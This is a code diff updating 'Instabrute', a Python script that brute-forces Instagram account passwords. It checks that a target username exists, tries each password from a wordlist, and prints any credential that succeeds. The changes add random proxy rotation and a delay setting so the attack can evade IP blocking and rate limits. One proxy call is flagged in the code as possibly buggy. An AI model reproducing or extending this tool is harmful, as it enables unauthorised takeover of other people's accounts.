@@ -3,9 +3,9 @@ import json
 import time
 import os
 import random
-
 import sys
 
+#Help function
 def Input(text):
 	value = ''
 	if sys.version_info.major > 2:
@@ -14,10 +14,7 @@ def Input(text):
 		value = raw_input(text)
 	return str(value)
 
-
-
-
-
+#The main class
 class Instabrute():
 	def __init__(self, username, passwordsFile='pass.txt'):
 		self.username = username
@@ -31,6 +28,12 @@ class Instabrute():
 		self.IsUserExists()
 
 
+		UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
+		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
+			self.randomProxy()
+
+
+	#Check if password file exists and check if he contain passwords
 	def loadPasswords(self):
 		if os.path.isfile(self.passwordsFile):
 			with open(self.passwordsFile) as f:
@@ -47,17 +50,24 @@ class Instabrute():
 			Input('[*] Press enter to exit')
 			exit()
 
-	
+	#Choose random proxy from proxys file
 	def randomProxy(self):
 		plist = open('proxy.txt').read().splitlines()
 		proxy = random.choice(plist)
 
-		if not proxy in proxyUsed:
+		if not proxy in self.UsedProxys:
 			self.CurrentProxy = proxy
 			self.UsedProxys.append(proxy)
-		print ('[*] Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy }).text)
+		try:
+			print('')
+			print('[*] Check new ip...')
+			print ('[*] Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
+		except Exception as e:
+			print  ('[*] Can\'t reach proxy "%s"' % proxy)
+		print('')
 
 
+	#Check if username exists in instagram server
 	def IsUserExists(self):
 		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
 		if (r.status_code == 404):
@@ -67,7 +77,7 @@ class Instabrute():
 		elif (r.status_code == 200):
 			return True
 
-
+	#Try to login with password
 	def Login(self, password):
 		sess = requests.Session()
 
@@ -102,7 +112,8 @@ class Instabrute():
 		data = json.loads(r.text)
 		if (data['status'] == 'fail'):
 			print (data['message'])
-			randomProxy()
+			print ('[$] Try to use proxy after fail.')
+			randomProxy() #Check that, may contain bugs
 			return False
 
 		#return session if password is correct 
@@ -112,27 +123,25 @@ class Instabrute():
 			return False
 
 
-			
 
 
 
-###Start###
 
+instabrute = Instabrute(Input('Please enter a username: '))
 
-username = Input('Please enter a username: ')
-instabrute = Instabrute(username)
+try:
+	delayLoop = int(Input('[*] Please add delay between the bruteforce action (in seconds): ')) 
+except Exception as e:
+	print ('[*] Error, software use the defult value "4"')
+	delayLoop = 4
+print ('')
 
-delayLoop = int(Input('Please add delay between the bruteforce action (in seconds): ')) 
-
-UsePorxy = Input('Do you want to use proxy (y/n): ').upper()
-if (UsePorxy == 'Y' or UsePorxy == 'YES'):
-	instabrute.randomProxy()
 
 
 for password in instabrute.passwords:
 	sess = instabrute.Login(password)
 	if sess:
-		print ('Login success %s' % [username,password])
+		print ('Login success %s' % [instabrute.username,password])
 	else:
 		print ('[*] Password incorrect [%s]' % password)
 
